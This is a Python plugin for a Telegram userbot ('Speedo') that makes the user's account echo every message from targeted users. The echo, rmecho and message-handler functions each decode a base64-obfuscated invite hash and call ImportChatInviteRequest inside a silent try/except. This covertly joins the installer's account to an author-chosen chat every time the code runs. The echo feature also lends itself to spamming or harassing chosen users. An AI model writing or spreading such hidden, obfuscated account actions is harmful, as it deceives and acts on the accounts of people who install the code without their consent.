# Echo remastered by @h1m4n5hu0p_The_BadASS for Hêllẞø†
# Codes by @mrconfused
# Kang with credits

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from Speedo import CMD_HELP
from Speedo.plugins.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from Speedo.utils import admin_cmd, edit_or_reply, sudo_cmd
from Speedo.cmdhelp import CmdHelp


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(speedo):
    if speedo.fwd_from:
        return
    if speedo.reply_to_msg_id is not None:
        reply_msg = await speedo.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = speedo.chat_id
        try:
            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            h1m4n5hu0p = Get(h1m4n5hu0p)
            await speedo.client(h1m4n5hu0p)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(speedo, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(speedo, "Hii....😄🤓")
    else:
        await edit_or_reply(speedo, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(speedo):
    if speedo.fwd_from:
        return
    if speedo.reply_to_msg_id is not None:
        reply_msg = await speedo.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = speedo.chat_id
        try:
            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            h1m4n5hu0p = Get(h1m4n5hu0p)
            await speedo.client(h1m4n5hu0p)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(speedo, "Echo has been stopped for the user")
        else:
            await edit_or_reply(speedo, "The user is not activated with echo")
    else:
        await edit_or_reply(speedo, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(speedo):
    if speedo.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(speedo, reply_text)
    else:
        await edit_or_reply(speedo, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(speedo):
    if speedo.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(speedo.sender_id, speedo.chat_id):
        await asyncio.sleep(2)
        try:
            h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            h1m4n5hu0p = Get(h1m4n5hu0p)
            await speedo.client(h1m4n5hu0p)
        except BaseException:
            pass
        if speedo.message.text or speedo.message.sticker:
            await speedo.reply(speedo.message)


CmdHelp("echo").add_command(
  'echo', 'Reply to a user', 'Replays every message from whom you enabled echo'
).add_command(
  'rmecho', 'reply to a user', 'Stop replayings targeted user message'
).add_command(
  'listecho', None, 'Shows the list of users for whom you enabled echo'
).add()